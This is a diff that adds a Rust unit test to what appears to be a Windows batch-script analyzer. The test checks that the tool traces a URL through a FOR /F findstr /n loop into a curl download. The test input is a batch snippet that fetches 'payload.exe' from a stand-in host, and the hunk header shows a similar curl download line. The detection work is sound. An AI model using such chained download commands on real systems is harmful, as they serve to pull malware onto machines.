@@ -3806,6 +3806,29 @@ for /f "tokens=* delims=" %%U in ('findstr /f:files.txt "https://"') do curl -o 
     }
 
     #[test]
+    fn for_f_findstr_n_line_number_prefix_can_be_stripped() {
+        let report = analyze(
+            br#"echo noise>web.txt
+echo https://findstr-line-number.example/payload.exe>>web.txt
+for /f "tokens=1,* delims=:" %%A in ('findstr /n "https://" web.txt') do curl -o payload.exe %%B"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://findstr-line-number.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F findstr /n output did not feed stripped URL to curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn for_f_sort_reads_generated_file_source() {
         let report = analyze(
             br#"echo noise>urls.txt
